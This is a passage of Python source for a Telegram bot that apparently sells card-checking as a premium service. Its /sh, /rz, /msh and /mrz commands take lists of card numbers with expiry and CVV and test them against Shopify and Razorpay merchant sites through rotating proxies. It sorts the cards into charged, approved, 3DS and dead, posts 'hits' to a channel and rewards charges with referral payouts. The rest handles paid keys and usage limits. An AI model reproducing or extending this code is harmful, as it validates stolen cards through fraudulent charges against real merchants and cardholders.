        f"📁 {bs('Total in rz_sites.txt')}: <code>{len(load_rz_sites())}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]rzstat$'))
async def cmd_rzstat(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_rz_sites()
    last = _read_json(RZ_LAST_SCAN_FILE, {})
    body = f"💳 <b>{bs('Razorpay Sites')}</b>\n{SEP}\n"
    body += f"📁 {bs('Total')}: <code>{len(sites)}</code>\n"
    if last:
        when = datetime.fromtimestamp(last.get("ts", 0)).strftime("%Y-%m-%d %H:%M")
        body += f"{SEP}\n"
        body += f"🕐 {bs('Last scan')}: <code>{when}</code>\n"
        body += f"📥 {bs('Tested')}: <code>{last.get('before', 0)}</code>\n"
        body += f"✅ {bs('Live')}: <code>{last.get('live', 0)}</code>\n"
        body += f"❌ {bs('Dead')}: <code>{last.get('dead', 0)}</code>\n"
        body += f"🧨 {bs('Errors')}: <code>{last.get('errors', 0)}</code>\n"
    body += f"{SEP}\n"
    body += f"💡 <code>• /rzscan</code> — check + purge dead\n"
    body += f"💡 <code>• /rzharvest donate,pay,seva</code> — expand\n"
    await styled_reply(event, pe(body))


# ====================== SINGLE: /sh ======================
@client.on(events.NewMessage(pattern=r'^[/.]sh\s+'))
async def cmd_sh(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if not await _check_free_or_premium(event, uid):
        return
    if uid not in ADMIN_ID and is_premium(uid):
        ulimit = get_premium_daily_limit(uid)
        if ulimit > 0:
            used = get_premium_daily_used(uid)
            if used >= ulimit:
                return await styled_reply(event, pe(
                    f"⚠️ <b>{bs('Daily limit reached')}</b>\n{SEP}\n"
                    f"Used: <code>{used}/{ulimit}</code>"))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Syntax')}</b>\n"
            f"└─ <code>• /sh card|mm|yy|cvv</code>"))
    cards = extract_cc(parts[1])
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Checking')} <code>{card}</code>..."))
    st = time.time()
    rotator = SmartRotator()
    http_session = await get_user_http_session(uid, "sp")
    sem = get_user_sem(uid, "sp")
    try:
        async with sem:
            result, proxy_used = await check_card_with_retry(
                card, sites, proxies, max_retries=2,
                rotator=rotator, http_session=http_session)
        elapsed = time.time() - st
        bin_tuple = await get_bin_info(card.split('|')[0])
        text = format_shopify_single(result, bin_tuple, elapsed)
        status = result.get('status', 'Dead')
        _consume_free(uid)
        if uid not in ADMIN_ID and is_premium(uid):
            inc_premium_daily_used(uid)
        if status in ("Charged", "Approved", "3DS"):
            if status == "Charged":
                increment_charge_count(uid)
                asyncio.create_task(_process_referral_payout(uid))
                asyncio.create_task(_process_streak_update(uid))
            video_path = _pick_hit_video()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await styled_reply(event, text, buttons=HIT_BUTTON)
            asyncio.create_task(send_realtime_hit(uid, result, status, name,
                                                   "Shopify", video_path=video_path))
            asyncio.create_task(send_hit_to_channel(
                card, status, result.get('message', ''),
                result.get('gateway', 'Shopify'),
                result.get('price', '-'),
                user_mention=f"@{username}" if username else name,
                user_id=uid, gateway_type="Shopify",
                site=result.get('site'), proxy_used=proxy_used,
                video_path=video_path))
        else:
            await edit_entities(status_msg, text, buttons=HIT_BUTTON)
    except Exception as e:
        try:
            await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                                   parse_mode='html')
        except Exception:
            pass
    finally:
        await cleanup_user_http_session(uid, "sp")


# ====================== SINGLE: /rz ======================
@client.on(events.NewMessage(pattern=r'^[/.]rz\s+'))
async def cmd_rz(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if not await _check_free_or_premium(event, uid):
        return
    if uid not in ADMIN_ID and is_premium(uid):
        ulimit = get_premium_daily_limit(uid)
        if ulimit > 0:
            used = get_premium_daily_used(uid)
            if used >= ulimit:
                return await styled_reply(event, pe(
                    f"⚠️ <b>{bs('Daily limit reached')}</b>\n{SEP}\n"
                    f"Used: <code>{used}/{ulimit}</code>"))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Syntax')}</b>\n"
            f"└─ <code>• /rz card|mm|yy|cvv</code>"))
    cards = extract_cc(parts[1])
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]
    sites = load_rz_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No Razorpay sites')}</b> — /addrzsites"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Checking Razorpay')} <code>{card}</code>..."))
    st = time.time()
    rotator = SmartRotator()
    http_session = await get_user_http_session(uid, "rz")
    sem = get_user_sem(uid, "rz")
    try:
        async with sem:
            result, proxy_used = await check_rz_with_retry(
                card, proxies, max_retries=2,
                rotator=rotator, http_session=http_session, sites=sites)
        elapsed = time.time() - st
        bin_tuple = await get_bin_info(card.split('|')[0])
        text = format_rz_single(result, bin_tuple, elapsed)
        status = result.get('status', 'Dead')
        _consume_free(uid)
        if uid not in ADMIN_ID and is_premium(uid):
            inc_premium_daily_used(uid)
        if status in ("Charged", "Approved", "3DS"):
            if status == "Charged":
                increment_charge_count(uid)
                asyncio.create_task(_process_referral_payout(uid))
                asyncio.create_task(_process_streak_update(uid))
            video_path = _pick_hit_video()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await styled_reply(event, text, buttons=HIT_BUTTON)
            asyncio.create_task(send_realtime_hit(uid, result, status, name,
                                                   "RazorPay", video_path=video_path))
            asyncio.create_task(send_hit_to_channel(
                card, status, result.get('message', ''),
                "RazorPay", result.get('price', '-'),
                user_mention=f"@{username}" if username else name,
                user_id=uid, gateway_type="RazorPay",
                site=result.get('site'), proxy_used=proxy_used,
                video_path=video_path))
        else:
            await edit_entities(status_msg, text, buttons=HIT_BUTTON)
    except Exception as e:
        try:
            await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                                   parse_mode='html')
        except Exception:
            pass
    finally:
        await cleanup_user_http_session(uid, "rz")


# ====================== MASS RUNNERS ======================
async def start_mass_shopify(user_id: int, cards: list, event, status_msg):
    sites = load_sites()
    if not sites:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No sites')}</b>"))
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = sender.username or f"user_{user_id}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{user_id}", "User"

    session_key = f"{user_id}_{status_msg.id}"
    ACTIVE_SESSIONS[session_key] = {"paused": False, "stopped": False}
    results = {
        'charged': [], 'approved': [], '3ds': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0, 'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Shopify',
    }
    user_sem = get_user_sem(user_id, "msp")
    http_session = await get_user_http_session(user_id, "msp")
    rotator = SmartRotator()
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_ui = [time.time()]

    cached_sites = sites
    cached_proxies = proxies
    last_refresh = [0]

    def _stop():
        s = ACTIVE_SESSIONS.get(session_key)
        return not s or s.get("stopped", False)

    async def worker():
        while not queue.empty():
            if _stop():
                return
            s = ACTIVE_SESSIONS.get(session_key)
            if not s:
                return
            while s.get("paused", False):
                await asyncio.sleep(1)
                s = ACTIVE_SESSIONS.get(session_key)
                if not s:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            nonlocal cached_sites, cached_proxies
            async with user_sem:
                if results['checked'] - last_refresh[0] >= 50:
                    cached_sites = load_sites()
                    cached_proxies = load_user_proxies(user_id)
                    last_refresh[0] = results['checked']
                if not cached_sites or not cached_proxies:
                    break
                result, proxy_used = await check_card_with_retry(
                    card, cached_sites, cached_proxies, max_retries=2,
                    rotator=rotator, http_session=http_session)
            if _stop():
                return
            results['checked'] += 1
            results['last_card'] = card
            results['last_response'] = (result.get('message') or '')[:50]
            results['last_price'] = result.get('price', '-')
            results['last_gateway'] = result.get('gateway', 'Shopify')
            status = result.get('status', 'Dead')
            if status in ('Charged', 'Approved', '3DS'):
                video_path = _pick_hit_video()
                if status == 'Charged':
                    results['charged'].append(result)
                    increment_charge_count(user_id)
                    asyncio.create_task(_process_milestone_payout(user_id))
                    asyncio.create_task(_process_streak_update(user_id))
                elif status == 'Approved':
                    results['approved'].append(result)
                else:
                    results['3ds'].append(result)
                asyncio.create_task(send_realtime_hit(user_id, result, status, name,
                                                       "Shopify", video_path=video_path))
                asyncio.create_task(send_hit_to_channel(
                    card, status, result.get('message', ''),
                    result.get('gateway', 'Shopify'),
                    result.get('price', '-'),
                    user_mention=f"@{username}" if username else name,
                    user_id=user_id, gateway_type="Shopify",
                    site=result.get('site'), proxy_used=proxy_used,
                    video_path=video_path))
            elif status == 'Error':
                results['errors'].append(result)
            else:
                results['dead'].append(result)
            queue.task_done()
            await asyncio.sleep(0)
            if time.time() - last_ui[0] >= 1.0:
                last_ui[0] = time.time()
                if session_key in ACTIVE_SESSIONS:
                    try:
                        await update_progress(user_id, status_msg.id, results,
                                              results['checked'], "Shopify")
                    except Exception:
                        pass

    workers = [asyncio.create_task(worker()) for _ in range(MSP_PER_USER_WORKERS)]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        try:
            await update_progress(user_id, status_msg.id, results,
                                  results['checked'], "Shopify")
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass
        SHOPIFY_RESULTS[user_id] = results
        await send_final_results(user_id, results, "Shopify")
        ACTIVE_SESSIONS.pop(session_key, None)
        await cleanup_user_http_session(user_id, "msp")
        cleanup_user_sem(user_id)
        await asyncio.sleep(300)
        SHOPIFY_RESULTS.pop(user_id, None)


async def start_mass_rz(user_id: int, cards: list, event, status_msg):
    sites = load_rz_sites()
    if not sites:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No Razorpay sites')}</b> — /addrzsites"))
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
        return
    if not RAZORPAY_ENGINE_OK:
        await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Razorpay engine missing')}</b>: <code>{_RZ_IMPORT_ERR}</code>"))
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = sender.username or f"user_{user_id}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{user_id}", "User"

    session_key = f"rz_{user_id}_{status_msg.id}"
    ACTIVE_SESSIONS[session_key] = {"paused": False, "stopped": False}
    results = {
        'charged': [], 'approved': [], '3ds': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0, 'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'RazorPay',
    }
    user_sem = get_user_sem(user_id, "rz")
    http_session = await get_user_http_session(user_id, "rz")
    rotator = SmartRotator()
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_ui = [time.time()]

    def _stop():
        s = ACTIVE_SESSIONS.get(session_key)
        return not s or s.get("stopped", False)

    async def worker():
        while not queue.empty():
            if _stop():
                return
            s = ACTIVE_SESSIONS.get(session_key)
            if not s:
                return
            while s.get("paused", False):
                await asyncio.sleep(1)
                s = ACTIVE_SESSIONS.get(session_key)
                if not s:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            async with user_sem:
                result, proxy_used = await check_rz_with_retry(
                    card, proxies, max_retries=2,
                    rotator=rotator, http_session=http_session, sites=sites)
            if _stop():
                return
            results['checked'] += 1
            results['last_card'] = card
            results['last_response'] = (result.get('message') or result.get('Response') or '')[:50]
            results['last_price'] = result.get('price', '-')
            status = result.get('status', 'Dead')
            if status in ('Charged', 'Approved', '3DS'):
                video_path = _pick_hit_video()
                if status == 'Charged':
                    results['charged'].append(result)
                    increment_charge_count(user_id)
                    asyncio.create_task(_process_milestone_payout(user_id))
                    asyncio.create_task(_process_streak_update(user_id))
                elif status == 'Approved':
                    results['approved'].append(result)
                else:
                    results['3ds'].append(result)
                asyncio.create_task(send_realtime_hit(user_id, result, status, name,
                                                       "RazorPay", video_path=video_path))
                asyncio.create_task(send_hit_to_channel(
                    card, status, result.get('message', ''),
                    "RazorPay", result.get('price', '-'),
                    user_mention=f"@{username}" if username else name,
                    user_id=user_id, gateway_type="RazorPay",
                    site=result.get('site'), proxy_used=proxy_used,
                    video_path=video_path))
            elif status == 'Error':
                results['errors'].append(result)
            else:
                results['dead'].append(result)
            queue.task_done()
            await asyncio.sleep(0)
            if time.time() - last_ui[0] >= 1.0:
                last_ui[0] = time.time()
                if session_key in ACTIVE_SESSIONS:
                    try:
                        await update_progress(user_id, status_msg.id, results,
                                              results['checked'], "RazorPay")
                    except Exception:
                        pass

    workers = [asyncio.create_task(worker()) for _ in range(MRZ_PER_USER_WORKERS)]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        try:
            await update_progress(user_id, status_msg.id, results,
                                  results['checked'], "RazorPay")
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass
        RAZORPAY_RESULTS[user_id] = results
        await send_final_results(user_id, results, "RazorPay")
        ACTIVE_SESSIONS.pop(session_key, None)
        await cleanup_user_http_session(user_id, "rz")
        cleanup_user_sem(user_id)
        await asyncio.sleep(300)
        RAZORPAY_RESULTS.pop(user_id, None)


# ====================== STOP ======================
@client.on(events.CallbackQuery(pattern=rb"^stop_(\d+)$"))
async def cb_stop(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not yours!", alert=True)
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_") or key.startswith(f"rz_{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    await event.answer(f"Stopped {stopped}", alert=True)


@client.on(events.NewMessage(pattern=r'^[/.]stop$'))
async def cmd_stop(event):
    uid = event.sender_id
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_") or key.startswith(f"rz_{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    if stopped:
        await styled_reply(event, pe(f"🛑 {bs('Stopped')} {stopped} {bs('session(s)')}"))
    else:
        await styled_reply(event, pe(f"⚠️ {bs('No active session')}"))


# ====================== MASS COMMANDS ======================
@client.on(events.NewMessage(pattern=r'^[/.]msh$'))
async def cmd_msh(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>• /msh</code>\n"
            f"📋 {bs('Max')}: "
            f"<code>{MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM}</code> "
            f"{bs('cards per file')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('No cards in file')}</b>"))
    HARD_CAP = MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM
    user_limit = get_cc_limit(uid)
    limit = min(user_limit, HARD_CAP)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, pe(
            f"⚠️ <b>{bs('File trimmed')}</b>\n{SEP}\n"
            f"📋 {bs('Limit')}: <code>{limit}</code> {bs('cards')}"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Starting Shopify mass check')} <code>{len(cards)}</code>..."))
    asyncio.create_task(start_mass_shopify(uid, cards, event, status_msg))


@client.on(events.NewMessage(pattern=r'^[/.]mrz$'))
async def cmd_mrz(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>• /mrz</code>\n"
            f"📋 {bs('Max')}: "
            f"<code>{MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM}</code> "
            f"{bs('cards per file')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('No cards in file')}</b>"))
    HARD_CAP = MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM
    user_limit = get_cc_limit(uid)
    limit = min(user_limit, HARD_CAP)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, pe(
            f"⚠️ <b>{bs('File trimmed')}</b>\n{SEP}\n"
            f"📋 {bs('Limit')}: <code>{limit}</code> {bs('cards')}"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Starting Razorpay mass check')} <code>{len(cards)}</code>..."))
    asyncio.create_task(start_mass_rz(uid, cards, event, status_msg))


# ====================== EXPORT CALLBACK ======================
async def _export_category(event, user_id: int, gateway: str, category: str):
    if event.sender_id != user_id:
        return await event.answer("Not your results!", alert=True)
    results = SHOPIFY_RESULTS.get(user_id) if gateway == "shopify" else RAZORPAY_RESULTS.get(user_id)
    if not results:
        return await event.answer("Results expired", alert=True)
    items = results.get(category, [])
    if not items:
        return await event.answer(f"No {category} cards", alert=True)
    fname = f"NOVA_{category.upper()}_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        _write_result_file(fname, f"{category.upper()} CARDS", items, gateway)
        await send_file_entities(
            user_id, fname,
            pe(f"✅ {bs(category.capitalize())} ({len(items)})"))
        os.remove(fname)
    except Exception as e:
        log_system("EXPORT", f"failed: {e}", "error")
    await event.answer("Sent!", alert=False)


@client.on(events.CallbackQuery(pattern=rb"^(shopify|razorpay)_export_(charged|approved|3ds|errors):(\d+)$"))
async def cb_export(event):
    m = event.pattern_match
    gateway = m.group(1).decode()
    category = m.group(2).decode()
    user_id = int(m.group(3).decode())
    await _export_category(event, user_id, gateway, category)


# ====================== KEY / REDEEM ======================
@client.on(events.NewMessage(pattern=r'^[/.]genkeys\s+'))
async def cmd_genkeys(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 5:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Usage')}</b>\n"
            f"<code>• /genkeys count hours max_users cc_limit [price]</code>\n"
            f"{SEP}\n"
            f"💡 <code>• /genkeys 5 24 1 1500 10</code>"))
    try:
        count = int(parts[1]); hours = int(parts[2])
        max_users = int(parts[3]); cc_limit = int(parts[4])
        price = float(parts[5]) if len(parts) > 5 else 0.0
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid numbers')}</b>"))
    if count < 1 or count > 100:
        return await styled_reply(event, pe(f"💎 <b>{bs('Count 1-100')}</b>"))
    keys_data = load_keys()
    now = datetime.now()
    expiry = (now + timedelta(hours=hours)).isoformat()
    generated = []
    for _ in range(count):
        key = generate_key()
        while key in keys_data:
            key = generate_key()
        keys_data[key] = {
            "hours": hours, "max_users": max_users, "cc_limit": cc_limit,
            "price": price, "created_at": now.isoformat(),
            "created_by": event.sender_id,
            "expiry": expiry, "used_by": [], "used_count": 0,
        }
        generated.append(key)
    save_keys(keys_data)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    price_disp = f"${price:.2f}" if price else "Free"
    text = pe(f"""⭐ <b>{bs('Keys generated')}</b>  (x{count})
{SEP}
""" + "\n".join(f"┣ <code>{k}</code>" for k in generated) + f"""
{SEP}
📅 {bs('Valid')}: {hours_disp}
👥 {bs('Users per key')}: {max_users}
💳 {bs('CC limit')}: {cc_limit}
💰 {bs('Price')}: {price_disp}
⏰ {bs('Key expires')}: {expiry[:16]}

✅ {bs('Redeem with')} <code>• /redeem KEY</code>""")
    await styled_reply(event, text)


@client.on(events.NewMessage(pattern=r'^[/.]redeem\s+'))
async def cmd_redeem(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /redeem NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    keys_data = load_keys()
    if key not in keys_data:
        await send_redeem_log(uid, key, "❌ Invalid Key", "Key not found")
        return await styled_reply(event, pe(
            f"❌ <b>{bs('Invalid key')}</b>\n🔐 <code>{key}</code>"))
    entry = keys_data[key]
    now = datetime.now()
    try:
        if now > datetime.fromisoformat(entry.get('expiry', '')):
            await send_redeem_log(uid, key, "❌ Expired", "Key past expiry")
            return await styled_reply(event, pe(f"❌ <b>{bs('Key expired')}</b>"))
    except Exception:
        pass
    used_by = entry.get('used_by', [])
    max_users = int(entry.get('max_users', 1))
    if uid in used_by:
        await send_redeem_log(uid, key, "❌ Already Used", f"user {uid}")
        return await styled_reply(event, pe(f"❌ <b>{bs('Already used')}</b>"))
    if len(used_by) >= max_users:
        await send_redeem_log(uid, key, "❌ Max Users", f"{len(used_by)}/{max_users}")
        return await styled_reply(event, pe(
            f"❌ <b>{bs('Key max users reached')}</b>\n"
            f"👥 <code>{len(used_by)}/{max_users}</code>"))
    if is_premium(uid):
        await send_redeem_log(uid, key, "❌ Already Premium", "user already premium")
        return await styled_reply(event, pe(f"❌ <b>{bs('Already premium')}</b>"))
    hours = int(entry.get('hours', DEFAULT_KEY_HOURS))
    cc_limit = int(entry.get('cc_limit', DEFAULT_KEY_CC_LIMIT))
    user_expiry = (now + timedelta(hours=hours)).timestamp()
    data = load_premium_users()
    data[str(uid)] = {"expiry": user_expiry, "cc_limit": cc_limit,
                      "key": key, "activated_at": now.isoformat()}
    save_premium_users(data)
    entry['used_by'] = used_by + [uid]
    entry['used_count'] = int(entry.get('used_count', 0)) + 1
    keys_data[key] = entry
    save_keys(keys_data)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    await send_redeem_log(uid, key, "✅ Success", f"Activated for {hours_disp}")
    await styled_reply(event, pe(
        f"🎉 <b>{bs('Premium activated')}</b>\n{SEP}\n"
        f"📅 {bs('Duration')}: <code>{hours_disp}</code>\n"
        f"💳 {bs('CC limit')}: <code>{cc_limit}</code>\n"
        f"⏰ {bs('Expires')}: <code>{datetime.fromtimestamp(user_expiry).strftime('%Y-%m-%d %H:%M')}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]listkeys$'))
async def cmd_listkeys(event):
    if event.sender_id not in ADMIN_ID:
        return
    keys_data = load_keys()
    if not keys_data:
        return await styled_reply(event, pe(f"💎 <b>{bs('No keys')}</b>"))
    now = datetime.now()
    lines = []
    for k, v in list(keys_data.items())[:50]:
        hours = v.get('hours', '?')
        used = v.get('used_count', 0); maxu = v.get('max_users', 1)
        expiry = v.get('expiry', '')[:16]
        status = "✅" if now.isoformat() < expiry else "❌"
        lines.append(f"{status} <code>{k}</code>\n    {hours}h · {used}/{maxu} · exp {expiry}")
    extra = f"\n<i>+{len(keys_data)-50} more</i>" if len(keys_data) > 50 else ""
    await styled_reply(event, pe(
        f"🔑 <b>{bs('Keys')}</b> (<code>{len(keys_data)}</code>)\n"
        f"{SEP}\n" + "\n".join(lines) + extra))


@client.on(events.NewMessage(pattern=r'^[/.]delkey\s+'))
async def cmd_delkey(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /delkey NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    keys_data = load_keys()
    if key not in keys_data:
        return await styled_reply(event, pe(f"❌ <b>{bs('Not found')}</b>"))
    del keys_data[key]
    save_keys(keys_data)
    await styled_reply(event, pe(f"✅ <b>{bs('Deleted')}</b> <code>{key}</code>"))


# ====================== PREMIUM / LIMITS ======================
@client.on(events.NewMessage(pattern=r'^[/.]addpremium\s+'))
async def cmd_addpremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <code>• /addpremium user_id [days] [cc_limit]</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    days = int(parts[2]) if len(parts) > 2 else 0
    cc_limit = int(parts[3]) if len(parts) > 3 else 100000
    data = load_premium_users()
    if days > 0:
        exp = (datetime.now() + timedelta(days=days)).timestamp()
        data[str(target)] = {"expiry": exp, "cc_limit": cc_limit,
                             "activated_at": datetime.now().isoformat()}
        exp_str = datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M')
    else:
        data[str(target)] = None
        exp_str = "Permanent"
    save_premium_users(data)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Premium added')}</b>\n"
        f"👤 <code>{target}</code>\n"
        f"⏰ <code>{exp_str}</code>\n"
        f"💳 CC <code>{cc_limit}</code>"))
    try:
        await send_entities(target,
            pe(f"🎉 <b>{bs('Premium activated')}</b>\n⏰ <code>{exp_str}</code>"))
    except Exception:
        pass


@client.on(events.NewMessage(pattern=r'^[/.]removepremium\s+'))
async def cmd_removepremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /removepremium user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if target in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Cannot remove admin')}</b>"))
    if remove_premium(target):
        await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b> <code>{target}</code>"))
        try:
            await send_entities(target, pe(f"⚠️ <b>{bs('Premium revoked')}</b>"))
        except Exception:
            pass
    else:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Not premium')}</b>"))


@client.on(events.NewMessage(pattern=r'^[/.]listpremium$'))
async def cmd_listpremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = load_premium_users()
    if not data:
        return await styled_reply(event, pe(f"💎 <b>{bs('No premium users')}</b>"))
    now = datetime.now().timestamp()
    lines = []
    for uid_str, info in list(data.items())[:50]:
        if info is None:
            lines.append(f"• <code>{uid_str}</code> — Permanent")
        elif isinstance(info, dict):
            exp = info.get('expiry', 0)
            cc = info.get('cc_limit', '-')
            if exp and now < float(exp):
                left = int((float(exp) - now) / 60)
                h, m = left // 60, left % 60
                lines.append(f"• <code>{uid_str}</code> — {h}h {m}m · CC {cc}")
            else:
                lines.append(f"• <code>{uid_str}</code> — ⚠️ Expired")
    extra = f"\n<i>+{len(data)-50} more</i>" if len(data) > 50 else ""
    await styled_reply(event, pe(
        f"👑 <b>{bs('Premium')}</b> (<code>{len(data)}</code>)\n"
        f"{SEP}\n" + "\n".join(lines) + extra))


@client.on(events.NewMessage(pattern=r'^[/.]setfreelimit\s+'))
async def cmd_setfreelimit(event):
    global FREE_DAILY_LIMIT, FREE_COOLDOWN_SEC
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Usage')}</b>\n"
            f"<code>• /setfreelimit daily [cooldown]</code>\n{SEP}\n"
            f"Current: <code>{FREE_DAILY_LIMIT}</code> / day · cooldown <code>{FREE_COOLDOWN_SEC}s</code>"))
    try:
        new_daily = int(parts[1])
        new_cool = int(parts[2]) if len(parts) > 2 else FREE_COOLDOWN_SEC
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid numbers')}</b>"))
    FREE_DAILY_LIMIT = new_daily
    FREE_COOLDOWN_SEC = new_cool
    await styled_reply(event, pe(
        f"✅ <b>{bs('Free limits updated')}</b>\n"
        f"📋 Daily: <code>{FREE_DAILY_LIMIT}</code>\n"
